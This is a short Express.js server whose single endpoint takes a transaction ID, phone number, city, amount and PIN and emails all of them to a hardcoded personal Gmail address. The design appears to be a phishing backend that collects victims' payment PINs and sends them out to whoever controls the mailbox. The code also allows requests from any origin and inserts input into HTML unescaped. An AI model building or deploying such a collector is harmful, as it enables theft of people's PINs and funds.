require('dotenv').config();

const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');

const app = express();
const port = process.env.PORT || 3000;

// Allow requests from any origin (for development purposes)
app.use(cors());

// Parse JSON bodies
app.use(bodyParser.json());

// HTML template for email
const htmlTemplate = `
<h1> Transaction Details</h1>
<p><strong> Transaction ID:</strong> {{transactionId}}</p>
<p><strong> Phone Number:</strong> {{phoneNumber}}</p>
<p><strong> City:</strong> {{city}}</p>
<p><strong> Amount:</strong> {{amountToPay}}</p>
<p><strong> PIN:</strong> {{pin}}</p>
`;

// Create transporter for nodemailer
const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
    },
});

// Endpoint to send transaction details via email
app.post('/sendTransaction', async (req, res) => {
    try {
        const { transactionId, phoneNumber, amountToPay, pin, city } = req.body;

        if (!transactionId || !phoneNumber || !amountToPay || !pin || !city) {
            return res.status(400).json({ error: 'Missing required fields' });
        }

        const html = htmlTemplate
            .replace('{{transactionId}}', transactionId)
            .replace('{{phoneNumber}}', phoneNumber)
            .replace('{{amountToPay}}', amountToPay)
            .replace('{{pin}}', pin)
            .replace('{{city}}', city);

        const info = await transporter.sendMail({
            from: process.env.EMAIL_USER, // Ensure this matches your environment variable
            to: 'sarajameswilliam718@gmail.com', // Change to the recipient's email address
            subject: 'New Transaction Alert',
            html: html,
        });

        console.log("Message sent: %s", info.messageId);

        res.json({ message: 'Transaction details sent successfully!' });
    } catch (error) {
        console.error("Error sending email:", error);
        res.status(500).json({ error: 'Failed to send transaction details' });
    }
});

app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
